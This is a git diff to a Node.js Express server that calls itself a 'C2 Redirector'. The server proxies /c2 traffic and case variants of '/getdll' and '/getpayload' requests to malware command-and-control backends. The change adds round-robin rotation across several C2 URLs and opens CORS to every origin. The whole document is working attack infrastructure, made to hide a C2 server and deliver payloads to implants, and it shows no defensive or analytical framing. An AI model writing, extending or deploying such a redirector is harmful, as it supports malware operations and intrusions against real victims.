@@ -11,9 +11,14 @@ const TARGET_C2_URLS = process.env.TARGET_C2_URLS ? process.env.TARGET_C2_URLS.s
   // Add more fallback URLs here if needed
 ];
 
-// Static target for now to avoid issues with dynamic function in target property
-const TARGET_C2_URL = TARGET_C2_URLS[0]; // Use the first URL as the static target
-console.log(`Using static target URL: ${TARGET_C2_URL}`);
+// Function to select a target URL (simple rotation or random selection)
+let currentTargetIndex = 0;
+function getCurrentTargetUrl() {
+  const targetUrl = TARGET_C2_URLS[currentTargetIndex];
+  // Rotate to next target for the next request (simple round-robin)
+  currentTargetIndex = (currentTargetIndex + 1) % TARGET_C2_URLS.length;
+  return targetUrl;
+}
 
 // Use Helmet to add security headers
 app.use(helmet({
@@ -26,6 +31,17 @@ app.use(helmet({
     }
   }
 }));
+
+// Add CORS headers to allow cross-origin requests
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+  next();
+});
 
 // Middleware to log request body size for uploads (avoid logging full body to prevent large output)
 app.use(express.raw({ type: '*/*', limit: '10mb' })); // Parse raw body for uploads
@@ -42,7 +58,7 @@ app.use((req, res, next) => {
 
 // Proxy middleware for /c2 endpoints
 app.use('/c2', createProxyMiddleware({
-  target: TARGET_C2_URL, // Use static target to avoid issues
+  target: () => getCurrentTargetUrl(), // Dynamically select target URL
   changeOrigin: true,
   pathRewrite: {
     '^/c2': '' // Remove /c2 prefix when forwarding to target
@@ -78,7 +94,7 @@ app.use([
   '/getdll', '/Getdll', '/GETDLL',
   '/getpayload', '/Getpayload', '/GETPAYLOAD'
 ], createProxyMiddleware({
-  target: TARGET_C2_URL, // Use static target to avoid issues
+  target: () => getCurrentTargetUrl(), // Dynamically select target URL
   changeOrigin: true,
   pathRewrite: (path, req) => {
     // Convert path to lowercase to match backend expectation if needed
@@ -115,5 +131,5 @@ app.all('*', (req, res) => {
 });
 
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`C2 Redirector running on port ${PORT}, proxying to target: ${TARGET_C2_URL}`);
+  console.log(`C2 Redirector running on port ${PORT}, proxying to dynamic targets: ${TARGET_C2_URLS.join(', ')}`);
 });
